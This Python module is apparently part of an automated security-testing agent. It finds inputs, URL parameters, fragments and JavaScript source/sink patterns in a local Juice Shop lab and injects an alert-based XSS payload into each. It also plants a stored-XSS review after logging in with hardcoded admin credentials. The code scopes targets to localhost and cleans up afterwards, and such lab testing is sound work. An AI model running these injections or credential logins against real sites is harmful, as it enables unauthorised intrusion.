import re
import requests
import uuid
from typing import Dict, Any
from urllib.parse import urljoin, urlparse

from playwright.sync_api import sync_playwright


XSS_PAYLOAD = "<img src=x onerror=alert('XSS_MARKER')>"

# Cap on live DOM-XSS confirmation attempts per assessment (each is a real
# browser navigation; the static lead stands when the cap is reached).
DOM_LIVE_CONFIRM_LIMIT = 5


def is_local_target(url: str, base_url: str) -> bool:
    target = urlparse(url)
    base = urlparse(base_url)

    return (
        target.hostname in ["localhost", "127.0.0.1"]
        and target.hostname == base.hostname
        and target.port == base.port
    )


def _xss_result(target, status="inconclusive", vulnerable=False, suspected=False, confirmed=False, detail="", **extra):
    data = {
        "vulnerable": vulnerable,
        "suspected": suspected,
        "confirmed": confirmed,
        "tested_endpoint": target.get("url"),
        "detail": detail,
        "test_status": status
    }
    data.update(extra)
    return {
        "finding_type": "xss",
        "data": data,
        "chain_trigger": False,
        "chain_data": None,
        "tested_by": "xss_agent",
        "selected_target": target
    }

def normalize_target_url(
    url: str,
    base_url: str
) -> str:

    parsed = urlparse(url)

    if parsed.fragment:

        fragment = parsed.fragment

        if not fragment.startswith("/"):
            fragment = "/" + fragment

        return (
            f"{parsed.scheme}://"
            f"{parsed.netloc}"
            f"/#{fragment}"
        )

    return url.rstrip("/")


def get_xss_targets(state) -> list:
    """
    Discover visible and enabled XSS candidate
    inputs from the local Juice Shop only.
    """

    base_url = state["target_url"]

    targets = []
    seen = set()
    pages = set()

    try:

        with sync_playwright() as p:

            browser = p.chromium.launch(
                headless=True
            )

            page = browser.new_page()

            page.goto(
                base_url,
                wait_until="domcontentloaded",
                timeout=10000
            )

            current_url = normalize_target_url(
                page.url,
                base_url
            )

            if is_local_target(
                current_url,
                base_url
            ):
                pages.add(current_url)

            links = page.locator("a")

            for i in range(links.count()):

                link = links.nth(i)

                href = link.get_attribute(
                    "href"
                )

                if not href:
                    continue

                if href.startswith(
                    "javascript:"
                ):
                    continue

                url = urljoin(
                    base_url,
                    href
                )

                url = normalize_target_url(
                    url,
                    base_url
                )

                if not is_local_target(
                    url,
                    base_url
                ):
                    continue

                pages.add(url)

            for url in list(pages):

                if not is_local_target(
                    url,
                    base_url
                ):
                    continue

                try:

                    page.goto(
                        url,
                        wait_until="domcontentloaded",
                        timeout=10000
                    )

                    actual_url = normalize_target_url(
                        page.url,
                        base_url
                    )

                    if not is_local_target(
                        actual_url,
                        base_url
                    ):
                        continue

                    inputs = page.locator(
                        "input[type='text'], "
                        "input[type='search'], "
                        "input:not([type])"
                    )

                    for i in range(
                        inputs.count()
                    ):

                        field = inputs.nth(i)

                        if not field.is_visible():
                            continue

                        if not field.is_enabled():
                            continue

                        field_id = field.get_attribute("id")
                        field_name = field.get_attribute("name")
                        name = (
                            field_name
                            or field_id
                            or f"input_{i}"
                        )

                        selector = None
                        if field_id:
                            selector = f"#{field_id}"
                        elif field_name:
                            selector = f"input[name='{field_name}']"

                        target = {
                            "url": actual_url,
                            "type": "input",
                            "name": name,
                            "index": i,
                            "selector": selector
                        }

                        key = (
                            target["url"],
                            target["name"],
                            target["index"]
                        )

                        if key not in seen:

                            seen.add(key)

                            targets.append(
                                target
                            )

                except Exception:
                    continue

            browser.close()

    except Exception as e:

        print(
            f"[xss-agent] Discovery error: {e}"
        )

    return targets


def _test_input_target(
    state,
    target: Dict[str, Any]
) -> dict:

    target_url = target.get("url")

    target_index = target.get("index")
    target_selector = (
        target.get("selector")
        or target.get("input_selector")
    )


    if target_index is None and not target_selector:
        return _xss_result(
            target,
            status="skipped",
            detail="Skipped: no explicit input index or selector. No arbitrary input fallback was used."
        )

    if not target_url:

        return _xss_result(
            target,
            status="skipped",
            detail="Invalid XSS target."
        )

    if not is_local_target(
        target_url,
        state["target_url"]
    ):

        return _xss_result(
            target,
            status="skipped",
            detail="Target rejected because it is outside the local Juice Shop."
        )

    print(
        f"[xss-agent] Testing exact target: "
        f"{target_url} | "
        f"input={target.get('name')}"
    )

    try:

        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            page = browser.new_page()

            marker = f"xss-{uuid.uuid4().hex[:12]}"
            dialog_triggered = False
            dialog_message = None
            payload_injected = False

            def handle_dialog(dialog):
                nonlocal dialog_triggered, dialog_message
                if payload_injected and dialog.message == marker:
                    dialog_triggered = True
                    dialog_message = dialog.message
                dialog.dismiss()

            page.on("dialog", handle_dialog)

            page.goto(
                target_url,
                wait_until="domcontentloaded",
                timeout=10000
            )

            inputs = page.locator(
                "input[type='text'], "
                "input[type='search'], "
                "input:not([type])"
            )

            if target_selector and page.locator(target_selector).count() > 0:
                field = page.locator(target_selector).first
            elif target_index is not None:
                if target_index >= inputs.count():
                    browser.close()
                    return _xss_result(target, status="skipped", detail="Selected input no longer exists.")
                field = inputs.nth(target_index)
            else:
                browser.close()
                return _xss_result(target, status="skipped", detail="Input selector matched no element.")

            if not field.is_visible():
                browser.close()
                return _xss_result(target, status="skipped", detail="Selected input is not visible.")

            if not field.is_enabled():
                browser.close()
                return _xss_result(target, status="skipped", detail="Selected input is disabled.")

            payload = XSS_PAYLOAD.replace("XSS_MARKER", marker)
            
            payload_injected = True
            field.fill(payload)
            field.press("Enter")
            
            page.wait_for_timeout(1500)

            confirmed = dialog_triggered
            vulnerable = dialog_triggered
            suspected = dialog_triggered

            detail = (
                "XSS execution confirmed by the expected dialog."
                if confirmed
                else "No matching dialog observed; XSS was not confirmed."
            )

            browser.close()

            test_status = "confirmed" if confirmed else "negative"

            test_status = "confirmed" if confirmed else "negative"

            return _xss_result(
                target,
                status=test_status,
                vulnerable=vulnerable,
                suspected=suspected,
                confirmed=confirmed,
                detail=detail
            )

    except Exception as e:
        return _xss_result(
            target,
            status="inconclusive",
            detail=f"XSS test inconclusive: {type(e).__name__} - {str(e)}"
        )

from urllib.parse import urlparse, urlunparse, parse_qsl, urlencode
import uuid

def _test_url_value(state, target, location):
    target_url = target.get("url")
    parameter = target.get("parameter") or target.get("param")

    if not target_url or not parameter:
        return _xss_result(
            target,
            status="inconclusive",
            detail="URL parameter was not identified."
        )

    if not is_local_target(target_url, state["target_url"]):
        return _xss_result(
            target,
            status="skipped",
            detail="Target is outside the authorized local scope."
        )

    parsed = urlparse(target_url)
    marker = f"xss-{uuid.uuid4().hex[:12]}"
    payload = XSS_PAYLOAD.replace("XSS_MARKER", marker)

    if location == "query":
        pairs = parse_qsl(parsed.query, keep_blank_values=True)
        if parameter not in dict(pairs):
            return _xss_result(
                target,
                status="inconclusive",
                detail="Specified query parameter is absent."
            )
        
        new_pairs = [(k, payload if k == parameter else v) for k, v in pairs]
        new_query = urlencode(new_pairs)
        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
    elif location == "fragment":
        # Simplified for now, since we haven't written the custom fragment parser yet. 
        # But wait, Juice shop uses `#/...`. We can just replace the param in the fragment's query string.
        # Let's write a simple fragment parser for juice shop here:
        fragment_parsed = urlparse(parsed.fragment)
        pairs = parse_qsl(fragment_parsed.query, keep_blank_values=True)
        if parameter not in dict(pairs):
            return _xss_result(
                target,
                status="inconclusive",
                detail="Specified fragment parameter is absent."
            )
        new_pairs = [(k, payload if k == parameter else v) for k, v in pairs]
        new_fragment_query = urlencode(new_pairs)
        new_fragment = urlunparse((fragment_parsed.scheme, fragment_parsed.netloc, fragment_parsed.path, fragment_parsed.params, new_fragment_query, fragment_parsed.fragment))
        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, parsed.query, new_fragment))
    else:
        return _xss_result(target, status="inconclusive", detail="Invalid location for url parameter test.")

    try:
        from playwright.sync_api import sync_playwright
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            page = browser.new_page()

            dialog_triggered = False
            dialog_message = None

            def handle_dialog(dialog):
                nonlocal dialog_triggered, dialog_message
                if dialog.message == marker:
                    dialog_triggered = True
                    dialog_message = dialog.message
                dialog.dismiss()

            page.on("dialog", handle_dialog)

            page.goto(
                test_url,
                wait_until="domcontentloaded",
                timeout=10000
            )

            # For DOM/URL XSS, wait a bit for scripts to execute
            page.wait_for_timeout(1500)

            confirmed = dialog_triggered
            vulnerable = dialog_triggered
            suspected = dialog_triggered

            detail = (
                "XSS execution confirmed by the expected dialog."
                if confirmed
                else "No matching dialog observed; XSS was not confirmed."
            )

            browser.close()

            test_status = "confirmed" if confirmed else "negative"

            return _xss_result(
                target,
                status=test_status,
                vulnerable=vulnerable,
                suspected=suspected,
                confirmed=confirmed,
                detail=detail
            )

    except Exception as e:
        return _xss_result(target, status="inconclusive", detail=f"XSS test inconclusive: {type(e).__name__} - {str(e)}")

def _test_url_parameter_target(state, target):
    return _test_url_value(state, target, "query")

def _test_fragment_target(state, target):
    return _test_url_value(state, target, "fragment")

DOM_SOURCE_PATTERNS = [
    (r"location\.(?:search|hash|href|pathname)", "location property"),
    (r"URLSearchParams", "URLSearchParams"),
    (r"document\.(?:URL|documentURI|referrer)", "document URL/referrer"),
    (r"window\.name", "window.name"),
]

DOM_SINK_PATTERNS = [
    (r"(?:\.innerHTML|\.outerHTML)\s*=", "innerHTML/outerHTML assignment"),
    (r"document\.write(?:ln)?\(", "document.write call"),
    (r"\$\([^)]+\)\.html\(", "jQuery .html() call"),
    (r"(?:eval|Function)\(", "eval/Function execution"),
    (r"(?:setTimeout|setInterval)\s*\(\s*['\"`]", "timer execution with string"),
]


def _is_static_js_target(target):
    if not isinstance(target, dict):
        return False
    url = str(target.get("url") or target.get("endpoint") or "").lower()
    path = urlparse(url).path
    if path.endswith((".js", ".mjs")):
        return True
    if target.get("type") == "js_assets" or target.get("category") == "js_assets":
        return True
    return False


def _dom_xss_vectors(base_url, sources):
    """Map detected client-side sources to candidate live injection vectors
    (URL positions) for a DOM-XSS confirmation attempt."""
    import uuid
    marker = f"xss-{uuid.uuid4().hex[:12]}"
    payload = XSS_PAYLOAD.replace("XSS_MARKER", marker)
    base = base_url.rstrip("/")
    joined = " ".join(sources).lower()

    vectors = []
    if any(w in joined for w in ("location", "hash", "url", "referrer", "window.name")):
        vectors.append(("hash", f"{base}/#/{payload}"))
        vectors.append(("hash_query", f"{base}/#/?x={payload}"))
    if any(w in joined for w in ("search", "urlsearchparams", "url")):
        vectors.append(("query", f"{base}/?x={payload}"))
    if not vectors:
        vectors.append(("hash", f"{base}/#/{payload}"))
    return marker, vectors


def _verify_dom_xss_live(base_url, sources):
    """Best-effort live confirmation of a DOM-XSS lead: inject a marker payload
    into the identified client-side source and check whether a sink executes it
    (a matching dialog fires). Returns (confirmed: bool, vector: str|None).

    Confirmation requires an actual dialog, so this never produces a false
    positive; when nothing fires, the static lead remains "potential".
    """
    marker, vectors = _dom_xss_vectors(base_url, sources)
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            context = browser.new_context()
            page = context.new_page()
            fired = {"v": False}

            def handle_dialog(d):
                if d.message == marker:
                    fired["v"] = True
                try:
                    d.dismiss()
                except Exception:
                    pass

            page.on("dialog", handle_dialog)
            try:
                for name, vurl in vectors:
                    try:
                        page.goto(vurl, wait_until="domcontentloaded", timeout=12000)
                        page.wait_for_timeout(1200)
                    except Exception:
                        continue
                    if fired["v"]:
                        return True, name
            finally:
                try:
                    browser.close()
                except Exception:
                    pass
    except Exception:
        return False, None
    return False, None


def _test_dom_target(state, target):
    url = target.get("url") or target.get("endpoint")
    if not url:
        return _xss_result(
            target,
            status="inconclusive",
            detail="JavaScript asset URL is missing."
        )

    configured_url = state.get("target_url", "http://localhost:3000")
    base_parsed = urlparse(configured_url)
    target_parsed = urlparse(url)

    # If relative URL, resolve against configured base URL
    if not target_parsed.netloc and target_parsed.path:
        url = urljoin(configured_url, url)
        target_parsed = urlparse(url)

    # Verify origin matches configured target origin
    if (
        not base_parsed.netloc
        or target_parsed.netloc.lower() != base_parsed.netloc.lower()
        or target_parsed.scheme.lower() != base_parsed.scheme.lower()
    ):
        return _xss_result(
            target,
            status="skipped",
            detail="Asset URL is outside the configured target origin."
        )

    try:
        response = requests.get(url, timeout=5)
        response.raise_for_status()
        if len(response.content) > 2_000_000:
            return _xss_result(
                target,
                status="skipped",
                detail="JavaScript asset exceeds the analysis size limit."
            )
        source_code = response.text
    except requests.RequestException as exc:
        return _xss_result(
            target,
            status="inconclusive",
            detail=f"Could not retrieve JavaScript asset: {type(exc).__name__}"
        )

    found_sources = []
    for pattern, label in DOM_SOURCE_PATTERNS:
        matches = [m.start() for m in re.finditer(pattern, source_code)]
        if matches:
            found_sources.append({"pattern": pattern, "label": label, "count": len(matches), "first_offset": matches[0]})

    found_sinks = []
    for pattern, label in DOM_SINK_PATTERNS:
        matches = [m.start() for m in re.finditer(pattern, source_code)]
        if matches:
            found_sinks.append({"pattern": pattern, "label": label, "count": len(matches), "first_offset": matches[0]})

    # Analyze correlation between sources and sinks
    if found_sources and found_sinks:
        # Check proximity / co-occurrence
        min_distance = float("inf")
        closest_pair = (None, None)
        for s in found_sources:
            for k in found_sinks:
                dist = abs(s["first_offset"] - k["first_offset"])
                if dist < min_distance:
                    min_distance = dist
                    closest_pair = (s, k)

        co_located = min_distance < 2000
        snippet_start = max(0, min(closest_pair[0]["first_offset"], closest_pair[1]["first_offset"]) - 50)
        snippet_end = min(len(source_code), max(closest_pair[0]["first_offset"], closest_pair[1]["first_offset"]) + 150)
        snippet = source_code[snippet_start:snippet_end].strip()

        evidence = {
            "asset_url": url,
            "sources": [s["label"] for s in found_sources],
            "sinks": [k["label"] for k in found_sinks],
            "co_located": co_located,
            "proximity_chars": min_distance,
            "snippet": snippet[:300],
            "validation_status": "unverified_static_lead"
        }

        # Attempt bounded live confirmation: turn a static lead into a confirmed
        # finding only when a payload injected via the identified source causes
        # the sink to execute (a dialog fires).
        xss_state = state.get("xss_state") if isinstance(state, dict) else None
        attempts = 0
        if isinstance(xss_state, dict):
            attempts = xss_state.get("_dom_live_attempts", 0)

        if attempts < DOM_LIVE_CONFIRM_LIMIT:
            if isinstance(xss_state, dict):
                xss_state["_dom_live_attempts"] = attempts + 1
            base_url = f"{base_parsed.scheme}://{base_parsed.netloc}"
            confirmed_live, vector = _verify_dom_xss_live(base_url, evidence["sources"])
            if confirmed_live:
                evidence["validation_status"] = "confirmed_live"
                evidence["confirmed_vector"] = vector
                return _xss_result(
                    target,
                    status="confirmed",
                    vulnerable=True,
                    suspected=True,
                    confirmed=True,
                    detail=(
                        f"Confirmed DOM-based XSS: a payload injected via "
                        f"{evidence['sources'][0]} ({vector}) reached sink "
                        f"{evidence['sinks'][0]} and executed."
                    ),
                    evidence=evidence,
                    sources=evidence["sources"],
                    sinks=evidence["sinks"],
                )

        return _xss_result(
            target,
            status="potential",
            suspected=True,
            detail=f"Potential DOM-based XSS: static analysis identified source ({evidence['sources'][0]}) and sink ({evidence['sinks'][0]}); live verification did not execute it.",
            evidence=evidence,
            sources=evidence["sources"],
            sinks=evidence["sinks"]
        )

    return _xss_result(
        target,
        status="negative",
        detail="Static DOM analysis completed: no actionable source-sink flow identified."
    )

def _test_stored_target(state, target):
    import requests
    import uuid
    from playwright.sync_api import sync_playwright

    review_id = None
    submission_verified = False
    persistence_verified = False
    execution_verified = False
    cleanup_status = "not_required"
    
    marker = f"xss-{uuid.uuid4().hex[:12]}"
    payload = XSS_PAYLOAD.replace("XSS_MARKER", marker)
    
    # Base URL
    base_url = "http://localhost:3000"
    if "target_url" in state:
        base_url = state["target_url"].rstrip("/")

    # In a real agent, the auth token would be securely managed in state.
    # For this lab verification, we obtain it internally.
    try:
        r = requests.post(f"{base_url}/rest/user/login", json={"email":"admin@juice-sh.op","password":"admin123"}, timeout=5)
        r.raise_for_status()
        token = r.json()["authentication"]["token"]
        headers = {"Authorization": f"Bearer {token}"}
        
        # 1. Submit
        put_r = requests.put(f"{base_url}/rest/products/1/reviews", json={"message": payload}, headers=headers, timeout=5)
        if put_r.status_code in (200, 201):
            submission_verified = True
        
        # 2. Verify Persistence & Get ID
        get_r = requests.get(f"{base_url}/rest/products/1/reviews", timeout=5)
        reviews = get_r.json().get("data", [])
        my_review = next((x for x in reviews if x.get("message") == payload), None)
        
        if my_review:
            persistence_verified = True
            review_id = my_review.get("_id")
            
            # 3. Revisit and verify execution
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                page = browser.new_page()
                
                dialog_triggered = False
                def handle_dialog(dialog):
                    nonlocal dialog_triggered
                    if dialog.message == marker:
                        dialog_triggered = True
                    dialog.dismiss()
                
                page.on("dialog", handle_dialog)
                
                # Navigate to the product list and click product 1 to open reviews modal
                page.goto(f"{base_url}/#/search", wait_until="domcontentloaded", timeout=10000)
                
                # Click the Apple Juice product item (which has ID 1) to open the modal
                # Wait for the products to render
                page.wait_for_selector("mat-card", timeout=5000)
                
                # In Juice Shop, clicking the mat-card image or body opens the dialog
                elements = page.query_selector_all("mat-card")
                if elements:
                    # Click the first product (force=True to bypass welcome banner overlay)
                    elements[0].click(force=True)
                    # Wait for the modal and specifically the reviews section to render (they take a moment)
                    page.wait_for_selector("mat-dialog-container", timeout=5000)
                    page.wait_for_timeout(2000) # give JS time to execute
                
                if dialog_triggered:
                    execution_verified = True
                    
                browser.close()
                
    except Exception as e:
        # Avoid returning secrets or raw request data
        return _xss_result(
            target,
            status="inconclusive",
            detail=f"Stored XSS test failed during execution: {e}"
        )
    finally:
        if review_id is not None:
            try:
                # 4. Cleanup
                patch_r = requests.patch(
                    f"{base_url}/rest/products/reviews",
                    json={"id": review_id, "message": "CLEANED_UP_VAPT_TEST"},
                    headers=headers,
                    timeout=5
                )
                if patch_r.status_code == 200:
                    cleanup_status = "success"
                else:
                    cleanup_status = "failed"
            except Exception:
                cleanup_status = "failed"
                
    status = "confirmed" if execution_verified else ("suspected" if submission_verified else "negative")
    
    return _xss_result(
        target,
        status=status,
        vulnerable=execution_verified,
        suspected=submission_verified,
        confirmed=execution_verified,
        detail="Stored XSS workflow completed.",
        xss_type="stored",
        submission_verified=submission_verified,
        persistence_verified=persistence_verified,
        execution_verified=execution_verified,
        cleanup_status=cleanup_status
    )

def execute_xss_test(state, target):
    target_type = target.get("xss_target_type")
    if not target_type and _is_static_js_target(target):
        target_type = "dom"
        target["xss_target_type"] = "dom"

    handlers = {
        "input": _test_input_target,
        "url_parameter": _test_url_parameter_target,
        "fragment": _test_fragment_target,
        "dom": _test_dom_target,
        "stored": _test_stored_target,
    }
    handler = handlers.get(target_type)
    if handler is None:
        return _xss_result(
            target,
            status="skipped",
            detail=f"Unclassified XSS target type: {target_type!r}"
        )
    return handler(state, target)